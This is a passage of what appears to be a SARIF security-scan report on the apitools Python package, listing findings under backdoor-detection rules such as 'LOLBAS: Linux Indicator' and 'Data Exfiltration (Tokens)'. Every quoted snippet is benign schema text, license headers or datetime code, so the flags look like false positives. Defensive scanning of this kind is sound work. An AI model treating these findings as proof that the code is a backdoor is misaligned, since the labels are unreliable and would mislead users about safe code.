          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 468,
                  "startColumn": 39,
                  "endLine": 468,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    },\n    \"writeRatioMax\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the slowest shard spent on writing output.\",\n     \"format\": \"double\"\n    }\n   }\n",
                    "rendered": {
                      "text": "    },\n    \"writeRatioMax\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the slowest shard spent on writing output.\",\n     \"format\": \"double\"\n    }\n   }\n",
                      "markdown": "`    },\n    \"writeRatioMax\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the slowest shard spent on writing output.\",\n     \"format\": \"double\"\n    }\n   }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 463,
                  "startColumn": 39,
                  "endLine": 463,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    },\n    \"writeRatioAvg\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the average shard spent on writing output.\",\n     \"format\": \"double\"\n    },\n    \"writeRatioMax\": {\n",
                    "rendered": {
                      "text": "    },\n    \"writeRatioAvg\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the average shard spent on writing output.\",\n     \"format\": \"double\"\n    },\n    \"writeRatioMax\": {\n",
                      "markdown": "`    },\n    \"writeRatioAvg\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the average shard spent on writing output.\",\n     \"format\": \"double\"\n    },\n    \"writeRatioMax\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 458,
                  "startColumn": 39,
                  "endLine": 458,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    },\n    \"waitRatioMax\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the slowest shard spent waiting to be scheduled.\",\n     \"format\": \"double\"\n    },\n    \"writeRatioAvg\": {\n",
                    "rendered": {
                      "text": "    },\n    \"waitRatioMax\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the slowest shard spent waiting to be scheduled.\",\n     \"format\": \"double\"\n    },\n    \"writeRatioAvg\": {\n",
                      "markdown": "`    },\n    \"waitRatioMax\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the slowest shard spent waiting to be scheduled.\",\n     \"format\": \"double\"\n    },\n    \"writeRatioAvg\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 453,
                  "startColumn": 39,
                  "endLine": 453,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    },\n    \"waitRatioAvg\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the average shard spent waiting to be scheduled.\",\n     \"format\": \"double\"\n    },\n    \"waitRatioMax\": {\n",
                    "rendered": {
                      "text": "    },\n    \"waitRatioAvg\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the average shard spent waiting to be scheduled.\",\n     \"format\": \"double\"\n    },\n    \"waitRatioMax\": {\n",
                      "markdown": "`    },\n    \"waitRatioAvg\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the average shard spent waiting to be scheduled.\",\n     \"format\": \"double\"\n    },\n    \"waitRatioMax\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 431,
                  "startColumn": 39,
                  "endLine": 431,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    },\n    \"readRatioMax\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the slowest shard spent reading input.\",\n     \"format\": \"double\"\n    },\n    \"recordsRead\": {\n",
                    "rendered": {
                      "text": "    },\n    \"readRatioMax\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the slowest shard spent reading input.\",\n     \"format\": \"double\"\n    },\n    \"recordsRead\": {\n",
                      "markdown": "`    },\n    \"readRatioMax\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the slowest shard spent reading input.\",\n     \"format\": \"double\"\n    },\n    \"recordsRead\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 426,
                  "startColumn": 39,
                  "endLine": 426,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    },\n    \"readRatioAvg\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the average shard spent reading input.\",\n     \"format\": \"double\"\n    },\n    \"readRatioMax\": {\n",
                    "rendered": {
                      "text": "    },\n    \"readRatioAvg\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the average shard spent reading input.\",\n     \"format\": \"double\"\n    },\n    \"readRatioMax\": {\n",
                      "markdown": "`    },\n    \"readRatioAvg\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the average shard spent reading input.\",\n     \"format\": \"double\"\n    },\n    \"readRatioMax\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 412,
                  "startColumn": 39,
                  "endLine": 412,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    },\n    \"computeRatioMax\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the slowest shard spent on CPU-bound tasks.\",\n     \"format\": \"double\"\n    },\n    \"id\": {\n",
                    "rendered": {
                      "text": "    },\n    \"computeRatioMax\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the slowest shard spent on CPU-bound tasks.\",\n     \"format\": \"double\"\n    },\n    \"id\": {\n",
                      "markdown": "`    },\n    \"computeRatioMax\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the slowest shard spent on CPU-bound tasks.\",\n     \"format\": \"double\"\n    },\n    \"id\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 407,
                  "startColumn": 39,
                  "endLine": 407,
                  "endColumn": 45,
                  "snippet": {
                    "text": "   \"properties\": {\n    \"computeRatioAvg\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the average shard spent on CPU-bound tasks.\",\n     \"format\": \"double\"\n    },\n    \"computeRatioMax\": {\n",
                    "rendered": {
                      "text": "   \"properties\": {\n    \"computeRatioAvg\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the average shard spent on CPU-bound tasks.\",\n     \"format\": \"double\"\n    },\n    \"computeRatioMax\": {\n",
                      "markdown": "`   \"properties\": {\n    \"computeRatioAvg\": {\n     \"type\": \"number\",\n     \"description\": \"Relative amount of time the average shard spent on CPU-bound tasks.\",\n     \"format\": \"double\"\n    },\n    \"computeRatioMax\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 257,
                  "startColumn": 683,
                  "endLine": 257,
                  "endColumn": 689,
                  "snippet": {
                    "text": "es. When the expirationTime for a given table is reached, that table will be deleted automatically. If a table's expirationTime is modified or removed before the table expires, or if you provide an explicit expirationTime when creating a table, that value takes precedence over the default expiration time indicated by this property.\",\n     \"format\": \"int64\"\n    },\n    \"description\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] A user-friendly description of the dataset.\"\n    },\n    \"etag\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] A hash of the resource.\"\n    },\n    \"fri",
                    "rendered": {
                      "text": "es. When the expirationTime for a given table is reached, that table will be deleted automatically. If a table's expirationTime is modified or removed before the table expires, or if you provide an explicit expirationTime when creating a table, that value takes precedence over the default expiration time indicated by this property.\",\n     \"format\": \"int64\"\n    },\n    \"description\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] A user-friendly description of the dataset.\"\n    },\n    \"etag\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] A hash of the resource.\"\n    },\n    \"fri",
                      "markdown": "`es. When the expirationTime for a given table is reached, that table will be deleted automatically. If a table's expirationTime is modified or removed before the table expires, or if you provide an explicit expirationTime when creating a table, that value takes precedence over the default expiration time indicated by this property.\",\n     \"format\": \"int64\"\n    },\n    \"description\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] A user-friendly description of the dataset.\"\n    },\n    \"etag\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] A hash of the resource.\"\n    },\n    \"fri`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 257,
                  "startColumn": 277,
                  "endLine": 257,
                  "endColumn": 283,
                  "snippet": {
                    "text": "     \"type\": \"string\",\n     \"description\": \"[Optional] The default lifetime of all tables in the dataset, in milliseconds. The minimum value is 3600000 milliseconds (one hour). Once this property is set, all newly-created tables in the dataset will have an expirationTime property set to the creation time plus the value in this property, and changing the value will only affect new tables, not existing ones. When the expirationTime for a given table is reached, that table will be deleted automatically. If a table's expirationTime is modified or removed before the table expires, or if you provide an ex",
                    "rendered": {
                      "text": "     \"type\": \"string\",\n     \"description\": \"[Optional] The default lifetime of all tables in the dataset, in milliseconds. The minimum value is 3600000 milliseconds (one hour). Once this property is set, all newly-created tables in the dataset will have an expirationTime property set to the creation time plus the value in this property, and changing the value will only affect new tables, not existing ones. When the expirationTime for a given table is reached, that table will be deleted automatically. If a table's expirationTime is modified or removed before the table expires, or if you provide an ex",
                      "markdown": "`     \"type\": \"string\",\n     \"description\": \"[Optional] The default lifetime of all tables in the dataset, in milliseconds. The minimum value is 3600000 milliseconds (one hour). Once this property is set, all newly-created tables in the dataset will have an expirationTime property set to the creation time plus the value in this property, and changing the value will only affect new tables, not existing ones. When the expirationTime for a given table is reached, that table will be deleted automatically. If a table's expirationTime is modified or removed before the table expires, or if you provide an ex`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 248,
                  "startColumn": 38,
                  "endLine": 248,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    },\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] The time when this dataset was created, in milliseconds since the epoch.\",\n     \"format\": \"int64\"\n    },\n    \"datasetReference\": {\n",
                    "rendered": {
                      "text": "    },\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] The time when this dataset was created, in milliseconds since the epoch.\",\n     \"format\": \"int64\"\n    },\n    \"datasetReference\": {\n",
                      "markdown": "`    },\n    \"creationTime\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only] The time when this dataset was created, in milliseconds since the epoch.\",\n     \"format\": \"int64\"\n    },\n    \"datasetReference\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 204,
                  "startColumn": 57,
                  "endLine": 204,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    },\n    \"skipLeadingRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The number of rows at the top of a CSV file that BigQuery will skip when reading the data. The default value is 0. This property is useful if you have header rows in the file that should be skipped.\",\n     \"format\": \"int64\"\n    }\n   }\n",
                    "rendered": {
                      "text": "    },\n    \"skipLeadingRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The number of rows at the top of a CSV file that BigQuery will skip when reading the data. The default value is 0. This property is useful if you have header rows in the file that should be skipped.\",\n     \"format\": \"int64\"\n    }\n   }\n",
                      "markdown": "`    },\n    \"skipLeadingRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] The number of rows at the top of a CSV file that BigQuery will skip when reading the data. The default value is 0. This property is useful if you have header rows in the file that should be skipped.\",\n     \"format\": \"int64\"\n    }\n   }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 4,
                  "endLine": 46,
                  "endColumn": 14,
                  "snippet": {
                    "text": "   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n",
                    "rendered": {
                      "text": "   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n",
                      "markdown": "`   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/message_types_test.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 141,
                  "startColumn": 43,
                  "endLine": 141,
                  "endColumn": 47,
                  "snippet": {
                    "text": "                plural_s = ''\n                if max_positional_args != 1:\n                    plural_s = 's'\n                raise TypeError('%s() takes at most %d positional argument%s '\n                                '(%d given)' % (wrapped.__name__,\n                                                max_positional_args,\n                                                plural_s, len(args)))\n",
                    "rendered": {
                      "text": "                plural_s = ''\n                if max_positional_args != 1:\n                    plural_s = 's'\n                raise TypeError('%s() takes at most %d positional argument%s '\n                                '(%d given)' % (wrapped.__name__,\n                                                max_positional_args,\n                                                plural_s, len(args)))\n",
                      "markdown": "`                plural_s = ''\n                if max_positional_args != 1:\n                    plural_s = 's'\n                raise TypeError('%s() takes at most %d positional argument%s '\n                                '(%d given)' % (wrapped.__name__,\n                                                max_positional_args,\n                                                plural_s, len(args)))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 294,
                  "startColumn": 5,
                  "endLine": 294,
                  "endColumn": 11,
                  "snippet": {
                    "text": "    if not time_zone_match:\n        return decoded_datetime\n\n    # Time zone info was included in the parameter.  Add a tzinfo\n    # object to the datetime.  Datetimes can't be changed after they're\n    # created, so we'll need to create a new one.\n    if time_zone_match.group('z'):\n",
                    "rendered": {
                      "text": "    if not time_zone_match:\n        return decoded_datetime\n\n    # Time zone info was included in the parameter.  Add a tzinfo\n    # object to the datetime.  Datetimes can't be changed after they're\n    # created, so we'll need to create a new one.\n    if time_zone_match.group('z'):\n",
                      "markdown": "`    if not time_zone_match:\n        return decoded_datetime\n\n    # Time zone info was included in the parameter.  Add a tzinfo\n    # object to the datetime.  Datetimes can't be changed after they're\n    # created, so we'll need to create a new one.\n    if time_zone_match.group('z'):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 257,
                  "startColumn": 31,
                  "endLine": 257,
                  "endColumn": 37,
                  "snippet": {
                    "text": "      ValueError: If the string is not in a recognized format.\n    \"\"\"\n    # Check if the string includes a time zone offset.  Break out the\n    # part that doesn't include time zone info.  Convert to uppercase\n    # because all our comparisons should be case-insensitive.\n    time_zone_match = _TIME_ZONE_RE.search(encoded_datetime)\n    if time_zone_match:\n",
                    "rendered": {
                      "text": "      ValueError: If the string is not in a recognized format.\n    \"\"\"\n    # Check if the string includes a time zone offset.  Break out the\n    # part that doesn't include time zone info.  Convert to uppercase\n    # because all our comparisons should be case-insensitive.\n    time_zone_match = _TIME_ZONE_RE.search(encoded_datetime)\n    if time_zone_match:\n",
                      "markdown": "`      ValueError: If the string is not in a recognized format.\n    \"\"\"\n    # Check if the string includes a time zone offset.  Break out the\n    # part that doesn't include time zone info.  Convert to uppercase\n    # because all our comparisons should be case-insensitive.\n    time_zone_match = _TIME_ZONE_RE.search(encoded_datetime)\n    if time_zone_match:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 256,
                  "startColumn": 36,
                  "endLine": 256,
                  "endColumn": 42,
                  "snippet": {
                    "text": "    Raises:\n      ValueError: If the string is not in a recognized format.\n    \"\"\"\n    # Check if the string includes a time zone offset.  Break out the\n    # part that doesn't include time zone info.  Convert to uppercase\n    # because all our comparisons should be case-insensitive.\n    time_zone_match = _TIME_ZONE_RE.search(encoded_datetime)\n",
                    "rendered": {
                      "text": "    Raises:\n      ValueError: If the string is not in a recognized format.\n    \"\"\"\n    # Check if the string includes a time zone offset.  Break out the\n    # part that doesn't include time zone info.  Convert to uppercase\n    # because all our comparisons should be case-insensitive.\n    time_zone_match = _TIME_ZONE_RE.search(encoded_datetime)\n",
                      "markdown": "`    Raises:\n      ValueError: If the string is not in a recognized format.\n    \"\"\"\n    # Check if the string includes a time zone offset.  Break out the\n    # part that doesn't include time zone info.  Convert to uppercase\n    # because all our comparisons should be case-insensitive.\n    time_zone_match = _TIME_ZONE_RE.search(encoded_datetime)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 41,
                  "endLine": 251,
                  "endColumn": 47,
                  "snippet": {
                    "text": "          microsecs.\n\n    Returns:\n      A datetime object with the date and time specified in encoded_datetime.\n\n    Raises:\n      ValueError: If the string is not in a recognized format.\n",
                    "rendered": {
                      "text": "          microsecs.\n\n    Returns:\n      A datetime object with the date and time specified in encoded_datetime.\n\n    Raises:\n      ValueError: If the string is not in a recognized format.\n",
                      "markdown": "`          microsecs.\n\n    Returns:\n      A datetime object with the date and time specified in encoded_datetime.\n\n    Raises:\n      ValueError: If the string is not in a recognized format.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 247,
                  "startColumn": 38,
                  "endLine": 247,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\n    Args:\n      encoded_datetime: A string in RFC 3339 format.\n      truncate_time: If true, truncate time string with precision higher than\n          microsecs.\n\n    Returns:\n",
                    "rendered": {
                      "text": "\n    Args:\n      encoded_datetime: A string in RFC 3339 format.\n      truncate_time: If true, truncate time string with precision higher than\n          microsecs.\n\n    Returns:\n",
                      "markdown": "`\n    Args:\n      encoded_datetime: A string in RFC 3339 format.\n      truncate_time: If true, truncate time string with precision higher than\n          microsecs.\n\n    Returns:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/util.py"
                },
                "region": {
                  "startLine": 231,
                  "startColumn": 55,
                  "endLine": 231,
                  "endColumn": 61,
                  "snippet": {
                    "text": "    def dst(self, _):\n        \"\"\"Get the daylight savings time offset.\n\n        The formats that ProtoRPC uses to encode/decode time zone\n        information don't contain any information about daylight\n        savings time. So this always returns a timedelta of 0.\n\n",
                    "rendered": {
                      "text": "    def dst(self, _):\n        \"\"\"Get the daylight savings time offset.\n\n        The formats that ProtoRPC uses to encode/decode time zone\n        information don't contain any information about daylight\n        savings time. So this always returns a timedelta of 0.\n\n",
                      "markdown": "`    def dst(self, _):\n        \"\"\"Get the daylight savings time offset.\n\n        The formats that ProtoRPC uses to encode/decode time zone\n        information don't contain any information about daylight\n        savings time. So this always returns a timedelta of 0.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
